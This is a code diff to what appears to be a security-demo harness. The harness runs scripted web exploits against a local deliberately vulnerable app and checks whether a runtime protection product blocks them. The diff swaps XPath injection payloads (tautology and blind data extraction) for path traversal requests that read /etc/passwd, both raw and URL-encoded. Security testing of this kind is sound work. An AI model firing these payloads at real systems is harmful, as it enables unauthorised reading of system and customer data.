@@ -12,6 +12,7 @@ import io
 import json
 import base64
 import re
+import random
 import yaml
 from typing import Dict, Optional
 from kubernetes import client, config
@@ -660,31 +661,31 @@ def exploit_ssti():
     finally:
         exploit_running = False
 
-@app.route('/exploit/xpath-injection')
-def exploit_xpath_injection():
+@app.route('/exploit/php-path-traversal')
+def exploit_php_path_traversal():
     global exploit_running, exploit_state, exploit_output_buffer, stop_exploit_flag
 
     if exploit_running:
         return jsonify({"status": "error", "message": "Exploit already running"}), 400
 
     exploit_running = True
-    exploit_state = "xpath_injection"
+    exploit_state = "php_path_traversal"
 
     try:
         session = requests.Session()
         login_result = run_login_exploit(session)
         if not login_result:
-            log_exploit_output("Login failed - cannot proceed with XPath injection exploit", "ERROR")
-            return jsonify({"status": "error", "message": "Login failed - cannot proceed with XPath injection exploit"}), 500
+            log_exploit_output("Login failed - cannot proceed with PHP Path Traversal exploit", "ERROR")
+            return jsonify({"status": "error", "message": "Login failed - cannot proceed with PHP Path Traversal exploit"}), 500
 
-        result = run_xpath_injection_exploit(session)
+        result = run_php_path_traversal_exploit(session)
         exploit_state = "finished"
-        log_exploit_output(f"XPath injection exploit completed - Success: {result}")
-        return jsonify({"status": "success", "message": "XPath injection exploit completed", "result": result}), 200
+        log_exploit_output(f"PHP Path Traversal exploit completed - Success: {result}")
+        return jsonify({"status": "success", "message": "PHP Path Traversal exploit completed", "result": result}), 200
     except Exception as e:
         exploit_state = "error"
-        log_exploit_output(f"XPath injection exploit failed: {str(e)}", "ERROR")
-        return jsonify({"status": "error", "message": f"XPath injection exploit failed: {str(e)}"}), 500
+        log_exploit_output(f"PHP Path Traversal exploit failed: {str(e)}", "ERROR")
+        return jsonify({"status": "error", "message": f"PHP Path Traversal exploit failed: {str(e)}"}), 500
     finally:
         exploit_running = False
 
@@ -703,7 +704,7 @@ def exploit_list():
         {"name": "XXE", "endpoint": "/exploit/xxe", "description": "XML External Entity injection"},
         {"name": "Insecure Deserialization", "endpoint": "/exploit/deserialization", "description": "Java Insecure Deserialization exploit using address import functionality"},
         {"name": "SSTI", "endpoint": "/exploit/ssti", "description": "FreeMarker Server-Side Template Injection (CVE-2025-64087)"},
-        {"name": "XPath Injection", "endpoint": "/exploit/xpath-injection", "description": "XPath injection exploit via tracking report service (ID lookup, search tautology, blind exfil)"}
+        {"name": "Path Traversal (PHP)", "endpoint": "/exploit/php-path-traversal", "description": "Path traversal exploit via PHP tracking report download endpoint"}
     ]
     
     return jsonify({
@@ -1579,68 +1580,57 @@ def run_ssti_exploit(session):
         log_exploit_output(f"Error during SSTI exploit: {str(e)}", "ERROR")
         return False
 
-def run_xpath_injection_exploit(session):
-    """Execute XPath injection exploits via tracking report service"""
-    log_exploit_output("Executing XPath injection exploits via tracking report service")
+def run_php_path_traversal_exploit(session):
+    """Execute Path Traversal exploits via PHP tracking report download endpoint"""
+    log_exploit_output("Executing Path Traversal exploits via PHP tracking report download endpoint")
+
+    success = False
 
     # -------------------------------------------------------
-    # 1. ID-based XPath injection (tracking_id query parameter)
-    #    Injected query: //shipment[@trackingId='TRACK-A1B2C3D4' or '1'='1']
-    #    Returns first shipment regardless of tracking ID.
+    # 1. Baseline: confirm a legitimate file fetch works.
     # -------------------------------------------------------
-    id_payload = "TRACK-A1B2C3D4' or '1'='1"
-    r = session.get(f"http://cargocats.localhost/api/tracking-report?tracking_id={requests.utils.quote(id_payload)}", timeout=15)
-    log_exploit_output(f"XPath injection (ID lookup) response status: {r.status_code}")
-    if r.status_code == 200:
-        try:
-            data = r.json()
-            log_exploit_output(f"XPath injection ID result: tracking_id={data.get('tracking_id')}, events={data.get('event_count')}")
-            if data.get('tracking_id'):
-                log_exploit_output("SUCCESS: XPath injection returned a tracking report via tautology injection")
-        except Exception:
-            pass
+    legit_file = "TRACK-A1B2C3D4.txt"
+    r = session.get(
+        f"http://cargocats.localhost/api/tracking-report/download?file={requests.utils.quote(legit_file)}",
+        timeout=15
+    )
+    log_exploit_output(f"Baseline download ({legit_file}) status: {r.status_code}")
+    if r.status_code == 200 and "TRACK-A1B2C3D4" in r.text:
+        log_exploit_output("Baseline download returned the expected tracking report")
 
     # -------------------------------------------------------
-    # 2. Search endpoint XPath injection (q query parameter)
-    #    Closes contains() early then adds a tautology to dump all records.
-    #    Injected: x') or '1'='1' or contains(cat,'
-    #    Resulting predicate: contains(...,'x') or '1'='1' or contains(cat,'...')
+    # 2. Classic dotdot traversal: read /etc/passwd
     # -------------------------------------------------------
-    search_payload = "x') or '1'='1' or contains(cat,'"
-    r = session.get(f"http://cargocats.localhost/api/tracking-report/search?q={requests.utils.quote(search_payload)}", timeout=15)
-    log_exploit_output(f"XPath injection (search) response status: {r.status_code}")
-    if r.status_code == 200:
-        try:
-            data = r.json()
-            count = data.get('count', 0)
-            log_exploit_output(f"XPath injection search returned {count} result(s)")
-            if count > 1:
-                log_exploit_output("SUCCESS: XPath injection dumped all shipment records via tautology injection")
-        except Exception:
-            pass
+    payload = "../../../../etc/passwd"
+    r = session.get(
+        f"http://cargocats.localhost/api/tracking-report/download?file={requests.utils.quote(payload)}",
+        timeout=15
+    )
+    log_exploit_output(f"PHP Path Traversal (raw dotdot) response status: {r.status_code}")
+    if r.status_code == 200 and "root:" in r.text:
+        log_exploit_output("SUCCESS: PHP Path Traversal returned /etc/passwd contents")
+        success = True
+    elif r.status_code in (403, 406):
+        log_exploit_output("PHP Path Traversal request appears to have been blocked (Protect/RASP)")
+        success = True
 
     # -------------------------------------------------------
-    # 3. Blind XPath — exfiltrate cat names containing 'iskers'
-    #    Closes contains() early then filters on a known cat name substring.
-    #    Injected: x') or contains(cat,'iskers') or contains(cat,'
-    #    Returns only the 'Whiskers' record if it exists — confirms data exfil.
+    # 3. URL-encoded variant, exercises a second sink trace
     # -------------------------------------------------------
-    blind_payload = "x') or contains(cat,'iskers') or contains(cat,'"
-    r = session.get(f"http://cargocats.localhost/api/tracking-report/search?q={requests.utils.quote(blind_payload)}", timeout=15)
-    log_exploit_output(f"XPath injection (blind/exfiltration) response status: {r.status_code}")
-    if r.status_code == 200:
-        try:
-            data = r.json()
-            results = data.get('results', [])
-            if results:
-                cats = [s.get('cat', '') for s in results]
-                log_exploit_output(f"SUCCESS: Blind XPath exfiltrated cat name(s): {cats}")
-            else:
-                log_exploit_output("Blind XPath returned no results (cat name not in XML yet)")
-        except Exception:
-            pass
+    encoded_payload = "..%2F..%2F..%2F..%2Fetc%2Fpasswd"
+    r = session.get(
+        f"http://cargocats.localhost/api/tracking-report/download?file={encoded_payload}",
+        timeout=15
+    )
+    log_exploit_output(f"PHP Path Traversal (URL-encoded) response status: {r.status_code}")
+    if r.status_code == 200 and "root:" in r.text:
+        log_exploit_output("SUCCESS: URL-encoded PHP Path Traversal returned /etc/passwd contents")
+        success = True
+    elif r.status_code in (403, 406):
+        log_exploit_output("URL-encoded PHP Path Traversal appears to have been blocked (Protect/RASP)")
+        success = True
 
-    return r.status_code in [200, 500]
+    return success
 
 
 ########################################
@@ -1762,12 +1752,12 @@ def exploit():
         run_ssti_exploit(session)
 
         # ================================================
-        # XPATH INJECTION EXPLOIT
+        # PHP PATH TRAVERSAL EXPLOIT
         # ================================================
-        exploit_state = "xpath_injection"
-        if check_exploit_stop("XPath injection"):
+        exploit_state = "php_path_traversal"
+        if check_exploit_stop("PHP Path Traversal"):
             return
-        run_xpath_injection_exploit(session)
+        run_php_path_traversal_exploit(session)
 
         exploit_state = "finished"
         log_exploit_output("Exploit execution completed successfully")
@@ -2207,20 +2197,20 @@ def traffic():
             )
             log_traffic_output(f"Tracking report POST event - Status: {r.status_code}")
 
-            # Search by partial tracking ID prefix
-            prefix = shipment_tracking_id[:8] if len(shipment_tracking_id) >= 8 else shipment_tracking_id
+            # Download a saved per-shipment report (uses one of the seeded files)
+            seeded_files = [
+                "TRACK-A1B2C3D4.txt",
+                "TRACK-E5F6G7H8.txt",
+                "TRACK-I9J0K1L2.txt",
+                "TRACK-M3N4O5P6.txt",
+                "TRACK-Q7R8S9T0.txt",
+            ]
+            chosen = random.choice(seeded_files)
             r = session.get(
-                f"http://cargocats.localhost/api/tracking-report/search?q={prefix}",
+                f"http://cargocats.localhost/api/tracking-report/download?file={requests.utils.quote(chosen)}",
                 timeout=10, allow_redirects=False
             )
-            log_traffic_output(f"Tracking report search by prefix - Status: {r.status_code}")
-        else:
-            # Fallback: search without a specific tracking ID
-            r = session.get(
-                "http://cargocats.localhost/api/tracking-report/search?q=TRACK",
-                timeout=10, allow_redirects=False
-            )
-            log_traffic_output(f"Tracking report search fallback - Status: {r.status_code}")
+            log_traffic_output(f"Tracking report download ({chosen}) - Status: {r.status_code}")
 
         traffic_state = "finished"
         log_traffic_output("Traffic generation completed successfully")
